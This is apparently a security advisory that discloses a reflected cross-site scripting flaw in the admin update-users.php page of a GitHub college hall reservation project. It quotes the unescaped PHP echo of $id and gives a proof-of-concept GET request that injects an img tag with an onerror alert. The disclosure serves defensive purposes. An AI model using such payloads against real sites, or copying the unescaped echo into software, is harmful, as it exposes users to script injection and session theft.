# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - Reflected XSS update-users.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/

## Affected Component
> /admin/update-users.php

## Code
```php
<a class="btn btn-secondary"  href='rooms.php?id=<?php echo $id; ?>'>Cancel</a>
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /admin/update-users.php?id="><img+src%3dx+onerror%3dalert("NoChizPlz")> HTTP/1.1
Host: [REDACTED]
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/0befcf4b-0226-4289-af62-d4a06370f8cb)

